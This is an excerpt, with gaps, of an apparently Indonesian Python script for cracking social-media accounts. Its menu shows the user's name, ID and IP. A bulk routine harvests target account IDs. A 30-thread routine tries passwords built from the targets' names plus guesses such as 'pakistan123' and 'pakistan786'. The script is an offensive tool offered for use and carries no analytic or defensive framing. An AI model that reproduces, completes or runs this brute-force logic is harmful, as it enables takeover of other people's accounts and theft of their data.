...
def menu(my_name,my_id):
	...
	fx = mark(sg, style='')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] \033[93mNama Kamu          : '+str(my_name))
	print(x+'['+h+'•'+x+'] \033[93mIni ID Kamu        : '+str(my_id))
	print(x+'['+h+'•'+x+'] \033[93mIp Hp Kamu         : '+str(sh['origin']))
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Masukan Jumblah ID kntl (Maksimal 10 ID lah)')
	try:
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL 👉 %s DOSA, INGAT NERAKA DEK'%(len(id))
	if len(id)==0:
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['pakistan','pakistan123','pakistan12345','Pakistan123 ','pakistan1234','pakistan1','pakistan12','pakistan786']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
